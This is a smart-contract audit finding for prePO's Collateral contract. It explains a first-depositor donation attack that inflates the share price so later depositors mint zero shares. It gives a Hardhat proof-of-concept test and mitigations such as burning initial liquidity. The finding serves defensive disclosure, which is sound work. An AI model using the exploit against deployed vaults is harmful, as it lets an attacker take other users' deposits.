## Tags

- bug
- 3 (High Risk)
- sponsor confirmed

# [First depositor can break minting of shares](https://github.com/code-423n4/2022-03-prepo-findings/issues/27) 

# Lines of code

https://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/Collateral.sol#L82-L91


# Vulnerability details

## Details

The attack vector and impact is the same as [TOB-YEARN-003](https://github.com/yearn/yearn-security/blob/master/audits/20210719_ToB_yearn_vaultsv2/ToB_-_Yearn_Vault_v_2_Smart_Contracts_Audit_Report.pdf), where users may not receive shares in exchange for their deposits if the total asset amount has been manipulated through a large “donation”.

## Proof of Concept

- Attacker deposits 2 wei (so that it is greater than min fee) to mint 1 share
- Attacker transfers exorbitant amount to `_strategyController` to greatly inflate the share’s price. Note that the `_strategyController` deposits its entire balance to the strategy when its `deposit()` function is called.
- Subsequent depositors instead have to deposit an equivalent sum to avoid minting 0 shares. Otherwise, their deposits accrue to the attacker who holds the only share.

```jsx
it("will cause 0 share issuance", async () => {
	// 1. first user deposits 2 wei because 1 wei will be deducted for fee
	let firstDepositAmount = ethers.BigNumber.from(2)
	await transferAndApproveForDeposit(
	    user,
	    collateral.address,
	    firstDepositAmount
	)
	
	await collateral
	    .connect(user)
	    .deposit(firstDepositAmount)
	
	// 2. do huge transfer of 1M to strategy to controller
	// to greatly inflate share price
	await baseToken.transfer(strategyController.address, ethers.utils.parseEther("1000000"));
	
	// 3. deployer tries to deposit reasonable amount of 10_000
	let subsequentDepositAmount = ethers.utils.parseEther("10000");
	await transferAndApproveForDeposit(
	    deployer,
	    collateral.address,
	    subsequentDepositAmount
	)

	await collateral
	    .connect(deployer)
	    .deposit(subsequentDepositAmount)
	
	// receives 0 shares in return
	expect(await collateral.balanceOf(deployer.address)).to.be.eq(0)
});
```

## Recommended Mitigation Steps

- [Uniswap V2 solved this problem by sending the first 1000 LP tokens to the zero address](https://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2Pair.sol#L119-L124). The same can be done in this case i.e. when `totalSupply() == 0`, send the first min liquidity LP tokens to the zero address to enable share dilution.
- Ensure the number of shares to be minted is non-zero: `require(_shares != 0, "zero shares minted");`
- Create a periphery contract that contains a wrapper function that atomically calls `initialize()` and `deposit()`
- Call `deposit()` once in `initialize()` to achieve the same effect as the suggestion above.

